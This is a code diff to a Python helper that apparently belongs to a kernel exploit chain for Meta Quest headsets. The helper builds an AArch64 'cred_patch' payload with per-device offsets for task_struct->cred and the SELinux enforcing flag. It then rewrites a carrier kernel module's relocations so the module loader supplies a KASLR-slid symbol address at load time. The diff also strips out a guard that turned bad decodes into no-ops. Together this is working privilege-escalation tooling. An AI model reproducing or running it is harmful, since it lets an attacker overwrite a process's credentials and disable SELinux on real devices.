@@ -4,39 +4,30 @@
 # deltas are (symbol - __platform_driver_register) from the target vmlinux (signed, 32-bit range).
 # enf_off/cred_off default to Q3 5.10 (0 / 0x778); pass 1 / 0x7e8 for Quest Pro 4.19. One template,
 # both devices — the caller (orchestrate.py) reads them from the target JSON.
+#
+# The carrier's __platform_driver_register CALL26 reloc is REWRITTEN in place to R_AARCH64_ABS64
+# pointing at the patch's anchor64 data slot: the kernel module loader then writes the real
+# (KASLR-slid) symbol address there at load time. We read it as data -> pdr. CALL26 can't be used
+# because the loader routes out-of-range module calls through a PLT veneer (Quest Pro 4.19), so a
+# runtime bl-decode would yield the veneer address, not __platform_driver_register (-> panic).
 import struct, subprocess, sys, os
 HERE = os.path.dirname(os.path.abspath(__file__))
 sys.path.insert(0, HERE)
 from toolconf import CLANG, OBJCOPY, READELF   # central tool locations (edit toolconf.py / set env)
 R_AARCH64_CALL26 = 0x11b
+R_AARCH64_ABS64  = 0x101
 
 def _int(x): return int(x, 16) if isinstance(x, str) and x.lower().startswith("0x") else int(x)
 
-# <carrier> <out> <dsel> <dfv> <dpt> <pid> <dssuse> [enf_off] [cred_off] [dtext] [detext]
+# <carrier> <out> <dsel> <dfv> <dpt> <pid> <dssuse> [enf_off] [cred_off]
 carrier, out = sys.argv[1], sys.argv[2]
 dsel, dfv, dpt, pid, dssuse = (_int(x) for x in sys.argv[3:8])
 enf_off  = _int(sys.argv[8]) if len(sys.argv) > 8 else 0        # selinux_state.enforcing byte offset
 cred_off = _int(sys.argv[9]) if len(sys.argv) > 9 else 0x778    # task_struct->cred
-# optional kernel-text bounds (anchor-relative). If given, the module bails cleanly (ret, no writes)
-# unless the decoded pdr lands in [_text,_etext) — turns a bad/veneer anchor decode into a no-op
-# instead of a kernel panic. Q3 targets omit these (proven direct-bl decode); QPro passes them.
-dtext = _int(sys.argv[10]) if len(sys.argv) > 10 else None   # _text - anchor (lower bound)
-guarded = dtext is not None
-
-# Lower-bound guard only (compact — fits the inject-lib gap): bail (ret 0, no writes) unless
-# pdr >= _text. On arm64 the module region sits BELOW _text, so a PLT-veneer decode lands < _text
-# and is rejected -> a bad anchor decode becomes a clean no-op instead of a kernel panic.
-GUARD = """    // guard: bail unless pdr >= _text (rejects a below-_text PLT veneer / bad decode)
-    movz w9, #0                  // [G0] DTEXT_lo
-    movk w9, #0, lsl #16         // [G1] DTEXT_hi
-    add  x9, x19, w9, sxtw
-    cmp  x19, x9
-    b.lo done"""
 
 # --- assemble the template (substitute per-target struct offsets) ---
 tmpl = open(os.path.join(HERE, "asm", "cred_patch.S.tmpl")).read()
-src = tmpl.replace("@ENF_OFF@", str(enf_off)).replace("@CRED_OFF@", hex(cred_off)) \
-          .replace("@GUARD@", GUARD if guarded else "")
+src = tmpl.replace("@ENF_OFF@", str(enf_off)).replace("@CRED_OFF@", hex(cred_off))
 s = "/tmp/cred_patch.S"; o = "/tmp/cred_patch.o"; b = "/tmp/cred_patch.bin"
 open(s, "w").write(src)
 subprocess.run([CLANG, "-target", "aarch64-linux-gnu", "-c", s, "-o", o], check=True, capture_output=True)
@@ -45,10 +36,11 @@ patch = bytearray(open(b, "rb").read())
 anchor_off = None
 for l in subprocess.run([READELF, "-s", o], capture_output=True, text=True).stdout.splitlines():
     f = l.split()
-    if len(f) >= 8 and f[7] == "anchor": anchor_off = int(f[1], 16)
-assert anchor_off is not None, "anchor label not found"
+    if len(f) >= 8 and f[7] == "anchor64": anchor_off = int(f[1], 16)
+assert anchor_off is not None, "anchor64 label not found"
+assert anchor_off % 8 == 0, f"anchor64 not 8-aligned (0x{anchor_off:x})"
 
-# --- patch the 8 movz/movk (w-reg) immediates in program order ---
+# --- patch the 10 movz/movk (w-reg) immediates in program order: DSEL, DSSUSE, DFV, DPT, PID ---
 def set_imm16(word, imm):  # keep opcode+Rd+hw, set imm16 (bits 20:5)
     return (word & ~(0xffff << 5)) | ((imm & 0xffff) << 5)
 mov_offsets = []
@@ -56,12 +48,9 @@ for off in range(0, len(patch), 4):
     w = struct.unpack_from("<I", patch, off)[0]
     if (w & 0xff800000) in (0x52800000, 0x72800000):  # movz/movk, sf=0 (w-reg)
         mov_offsets.append(off)
-# program order: [guard: DTEXT] then DSEL, DSSUSE, DFV, DPT, PID
 def lohi(v): return [v & 0xffff, (v >> 16) & 0xffff]
-vals = (lohi(dtext) if guarded else []) + \
-       lohi(dsel) + lohi(dssuse) + lohi(dfv) + lohi(dpt) + lohi(pid)
-want_n = 12 if guarded else 10
-assert len(mov_offsets) == want_n, f"expected {want_n} movz/movk-w, got {len(mov_offsets)}"
+vals = lohi(dsel) + lohi(dssuse) + lohi(dfv) + lohi(dpt) + lohi(pid)
+assert len(mov_offsets) == 10, f"expected 10 movz/movk-w, got {len(mov_offsets)}"
 for off, imm in zip(mov_offsets, vals):
     struct.pack_into("<I", patch, off, set_imm16(struct.unpack_from("<I", patch, off)[0], imm))
 
@@ -97,7 +86,11 @@ for i in range(n):
     r_off, r_info = struct.unpack_from("<QQ", d, e)
     typ = r_info & 0xffffffff; sym = r_info >> 32
     if typ == R_AARCH64_CALL26 and symname(sym) == "__platform_driver_register" and repointed == 0:
-        struct.pack_into("<Q", d, e, anchor_off); repointed += 1        # anchor -> our slot
+        # rewrite: R_AARCH64_ABS64 @ anchor64, same symbol, addend 0 -> loader writes &symbol there
+        struct.pack_into("<Q", d, e, anchor_off)                        # r_offset = anchor64 slot
+        struct.pack_into("<Q", d, e + 8, (sym << 32) | R_AARCH64_ABS64) # r_info = ABS64, same sym
+        struct.pack_into("<q", d, e + 16, 0)                            # r_addend = 0
+        repointed += 1
     elif r_off < len(patch):
         struct.pack_into("<Q", d, e + 8, 0)                             # -> R_AARCH64_NONE
 assert repointed == 1, "did not find __platform_driver_register CALL26 anchor"
